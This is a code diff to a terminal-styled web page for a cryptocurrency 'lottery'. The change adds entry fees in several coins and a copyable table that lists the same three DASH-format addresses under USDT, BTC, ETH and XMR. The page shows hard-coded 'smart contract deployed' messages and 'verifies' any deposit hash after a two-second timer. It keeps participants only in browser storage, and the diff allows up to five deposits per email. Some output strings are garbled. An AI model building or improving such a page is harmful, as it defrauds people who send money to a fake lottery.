@@ -373,13 +373,55 @@
             background-color: rgba(0, 0, 0, 0.8);
             z-index: 999;
         }
+        
+        /* New styles for deposit addresses table */
+        .address-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        
+        .address-table th, .address-table td {
+            padding: 8px;
+            text-align: left;
+            border: 1px solid #00aaff;
+        }
+        
+        .address-table th {
+            background-color: #001933;
+            color: #00ff00;
+        }
+        
+        .address-table td {
+            word-break: break-all;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            background-color: #003366;
+            color: #00aaff;
+            border: 1px solid #00aaff;
+            padding: 4px 8px;
+            cursor: pointer;
+            border-radius: 3px;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+        
+        .copy-btn:hover {
+            background-color: #004488;
+        }
+        
+        .copy-btn.copied {
+            background-color: #006600;
+            color: #00ff00;
+            border-color: #00ff00;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        
-        
-       
         
         <div class="screen" id="output">
             <div class="output-line">System initialized...</div>
@@ -388,7 +430,11 @@
             <div class="output-line success">✓ Blockchain integration active</div>
             <div class="output-line success">✓ Smart contract deployed</div>
             <div class="output-line">Maximum participants: <span class="highlight">1000</span></div>
-            <div class="output-line">Entry fee: <span class="highlight">5 DASH</span></div>
+            <div class="output-line">Entry fee: <span class="highlight">100 USDT</span></div>
+            <div class="output-line">Entry fee: <span class="highlight">0.0010 Bitcoin</span></div>
+            <div class="output-line">Entry fee: <span class="highlight">0.026 Ethereum</span></div>
+            <div class="output-line">Entry fee: <span class="highlight">0.41 Monero</span></div>
+            <div class="output-line">Entry fee: <span class="highlight">4.47 DASH</span></div>
             <div class="output-line">Grand prize: <span class="highlight">0.8 BTC</span></div>
             <div class="output-line">Current participants: <span id="current-count" class="highlight">0</span></div>
              <script>
@@ -440,11 +486,95 @@
         </div>
         
         <div id="deposit-section" class="hidden">
-            <div class="output-line">Send exactly 5 DASH to the following address:</div>
-            <div class="output-line highlight">XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</div>
-            <div class="output-line highlight">XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</div>
-            <div class="output-line highlight">Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</div>
-            <div class="output-line">Network: DASH</div>
+            <div class="output-line">Send to the addresses below exactly according to the daily coin price update announced above:</div>
+            
+            <table class="address-table">
+                <thead>
+                    <tr>
+                        <th>Network</th>
+                        <th>Address</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>USDT</td>
+                        <td>XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>USDT</td>
+                        <td>XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>USDT</td>
+                        <td>Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>BTC</td>
+                        <td>XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>BTC</td>
+                        <td>XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>BTC</td>
+                        <td>Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>ETH</td>
+                        <td>XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>ETH</td>
+                        <td>XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>ETH</td>
+                        <td>Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>XMR</td>
+                        <td>XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>XMR</td>
+                        <td>XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>XMR</td>
+                        <td>Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>DASH</td>
+                        <td>XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XmeyA3iiosepgqJdwiBbnXJPqnk6qnY8kf', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>DASH</td>
+                        <td>XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('XrBe6f3axgRLE45AKAu74w6KdnbW8UTZeY', this)">Copy</button></td>
+                    </tr>
+                    <tr>
+                        <td>DASH</td>
+                        <td>Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc</td>
+                        <td><button class="copy-btn" onclick="copyToClipboard('Xrgf31VuA9fTxK2vdYAe57qgVGc8WEWcoc', this)">Copy</button></td>
+                    </tr>
+                </tbody>
+            </table>
+            
             <div class="output-line">After sending, please enter your transaction hash:</div>
             <div class="input-area">
                 <span class="prompt">TX Hash:</span>
@@ -550,16 +680,6 @@
         const systemTimeElement = document.getElementById('system-time');
         const transactionsContainer = document.getElementById('transactions');
         
-        // Crypto price elements
-        const btcPriceElement = document.getElementById('btc-price');
-        const btcChangeElement = document.getElementById('btc-change');
-        const ethPriceElement = document.getElementById('eth-price');
-        const ethChangeElement = document.getElementById('eth-change');
-        const xmrPriceElement = document.getElementById('xmr-price');
-        const xmrChangeElement = document.getElementById('xmr-change');
-        const dashPriceElement = document.getElementById('dash-price');
-        const dashChangeElement = document.getElementById('dash-change');
-        
         // Initialize system
         function initSystem() {
             updateSystemTime();
@@ -644,6 +764,15 @@
         async function updateCryptoPrices() {
             try {
                 // Show loading state
+                const btcPriceElement = document.getElementById('btc-price');
+                const btcChangeElement = document.getElementById('btc-change');
+                const ethPriceElement = document.getElementById('eth-price');
+                const ethChangeElement = document.getElementById('eth-change');
+                const xmrPriceElement = document.getElementById('xmr-price');
+                const xmrChangeElement = document.getElementById('xmr-change');
+                const dashPriceElement = document.getElementById('dash-price');
+                const dashChangeElement = document.getElementById('dash-change');
+                
                 btcPriceElement.textContent = '$--.--';
                 btcChangeElement.textContent = 'Loading...';
                 btcChangeElement.className = 'crypto-change';
@@ -700,6 +829,15 @@
                 console.error('Error fetching crypto prices:', error);
                 
                 // Fallback to simulated prices if API fails
+                const btcPriceElement = document.getElementById('btc-price');
+                const btcChangeElement = document.getElementById('btc-change');
+                const ethPriceElement = document.getElementById('eth-price');
+                const ethChangeElement = document.getElementById('eth-change');
+                const xmrPriceElement = document.getElementById('xmr-price');
+                const xmrChangeElement = document.getElementById('xmr-change');
+                const dashPriceElement = document.getElementById('dash-price');
+                const dashChangeElement = document.getElementById('dash-change');
+                
                 btcPriceElement.textContent = '$--.--';
                 btcChangeElement.textContent = 'API Error';
                 
@@ -845,6 +983,10 @@
         function showHelp() {
             addOutput('Available commands:', 'info');
             addOutput('register - Register for the lottery');
+            addOutput('deposit  - Deposit 100 USDT');
+            addOutput('deposit  - Deposit 0.0010 BTC');
+            addOutput('deposit  - Deposit 0.026 ETH');
+            addOutput('deposit  - Deposit 0.41 XMR');
             addOutput('deposit  - Deposit 5 DASH');
             addOutput('status   - Show current status');
             addOutput('clear    - Clear the screen');
@@ -886,6 +1028,12 @@
                 return;
             }
             
+            // Validate email format
+            if (!isValidEmail(email)) {
+                addOutput('Please enter a valid email address.', 'error');
+                return;
+            }
+            
             // Check if wallet already registered
             if (systemState.participants.some(p => p.wallet === wallet)) {
                 addOutput('This wallet address is already registered.', 'error');
@@ -893,8 +1041,9 @@
             }
             
             // Check if email already registered
-            if (systemState.participants.some(p => p.email === email)) {
-                addOutput('This email address is already registered.', 'error');
+            const userDeposits = systemState.participants.filter(p => p.email === email).length;
+            if (userDeposits >= 5) {
+                addOutput('You have already reached the maximum of 5 deposits with this email.', 'error');
                 return;
             }
             
@@ -905,7 +1054,8 @@
                 email,
                 wallet,
                 deposited: false,
-                txHash: ''
+                txHash: '',
+                depositCount: 0
             };
             
             // Set as current user
@@ -919,7 +1069,13 @@
             hideRegistration();
             
             addOutput('Registration successful! Welcome ' + name + '.', 'success');
-            addOutput('Now please type "deposit" to proceed with your 5 DASH payment.', 'info');
+            addOutput('Now please type "deposit" to proceed with your payment.', 'info');
+        }
+        
+        // Validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
         }
         
         // Hide registration form
@@ -939,6 +1095,13 @@
                 return;
             }
             
+            // Check if user has reached the maximum of 5 deposits
+            const userDeposits = systemState.participants.filter(p => p.email === systemState.currentUser.email).length;
+            if (userDeposits >= 5) {
+                addOutput('You have reached the maximum of 5 deposits. Thank you for participating!', 'info');
+                return;
+            }
+            
             if (systemState.currentUser.deposited) {
                 addOutput('You have already deposited. Thank you for participating!', 'info');
                 return;
@@ -955,8 +1118,9 @@
             }
             depositSection.classList.remove('hidden');
             commandInput.disabled = true;
-            addOutput('Deposit instructions displayed. Please send exactly 5 DASH.', 'info');
+            addOutput('Deposit instructions displayed. Please send exactly Coin.', 'info');
         }
+        
         // Verify deposit
         function verifyDeposit() {
             const txHash = document.getElementById('tx-hash-input').value.trim();
@@ -972,16 +1136,23 @@
                 // Mark user as deposited
                 systemState.currentUser.deposited = true;
                 systemState.currentUser.txHash = txHash;
+                systemState.currentUser.depositCount = (systemState.currentUser.depositCount || 0) + 1;
+                
                 // Add to participants list
-                systemState.participants.push(systemState.currentUser); 
+                systemState.participants.push({...systemState.currentUser});
+                
                 // Update localStorage
                 localStorage.setItem('currentUser', JSON.stringify(systemState.currentUser));
-                saveSystemState(); 
+                saveSystemState();
+                
                 // Update UI
                 updateParticipantCount();
+                
                 // Hide deposit section
                 hideDeposit();
+                
                 addOutput('Deposit verified successfully! You are now entered in the lottery.', 'success');
+                addOutput(`You have made ${systemState.currentUser.depositCount} out of 5 allowed deposits.`, 'info');
                 addOutput('Good luck! The draw will occur when all 1000 participants have registered.', 'info');
             }, 2000);
         }
@@ -998,11 +1169,17 @@
         function showStatus() {
             addOutput('LOTTERY STATUS:', 'info');
            
+            addOutput('Entry fee: 100 USDT');
+            addOutput('Entry fee: 0.0010 BTC');
+            addOutput('Entry fee: 0.026 ETH');
+            addOutput('Entry fee: 0.41 XMR');
             addOutput('Entry fee: 5 DASH');
             addOutput('Prize pool: 0.8 BTC USDT');
             
             if (systemState.currentUser) {
+                const userDeposits = systemState.participants.filter(p => p.email === systemState.currentUser.email).length;
                 addOutput('Your status: ' + (systemState.currentUser.deposited ? 'Registered & Paid' : 'Registered - Payment Pending'));
+                addOutput(`Your deposits: ${userDeposits} out of 5 allowed`);
             }
             if (systemState.lotteryCompleted) {
                 addOutput('The lottery has been completed!', 'highlight');
@@ -1024,6 +1201,7 @@
                 addOutput('Admin mode deactivated', 'info');
             }
         } 
+        
         // Start the lottery draw
         function startLottery() {
             if (!systemState.adminMode) {
@@ -1079,11 +1257,13 @@
             participantsList.innerHTML = '';  
             systemState.participants.forEach(participant => {
                 const div = document.createElement('div');
-                div.textContent = participant.name + ' (' + participant.wallet + ')';
+                div.textContent = participant.name + ' (' + participant.wallet + ') - Deposits: ' + 
+                                 systemState.participants.filter(p => p.email === participant.email).length;
                 participantsList.appendChild(div);
             });
             document.getElementById('participants-container').classList.remove('hidden');
         }
+        
         // Reset system (admin only)
         function resetSystem() {
             if (!systemState.adminMode) {
@@ -1121,10 +1301,30 @@
                 winner: systemState.winner
             }));
         }
+        
         // Generate a random ID
         function generateId() {
             return Math.random().toString(36).substring(2) + Date.now().toString(36);
         }
+        
+        // Copy address to clipboard
+        function copyToClipboard(text, button) {
+            navigator.clipboard.writeText(text).then(() => {
+                // Visual feedback that text was copied
+                const originalText = button.textContent;
+                button.textContent = 'Copied!';
+                button.classList.add('copied');
+                
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.classList.remove('copied');
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+                addOutput('Failed to copy address to clipboard', 'error');
+            });
+        }
+        
         // Initialize the system when page loads
         window.onload = initSystem;
     </script>
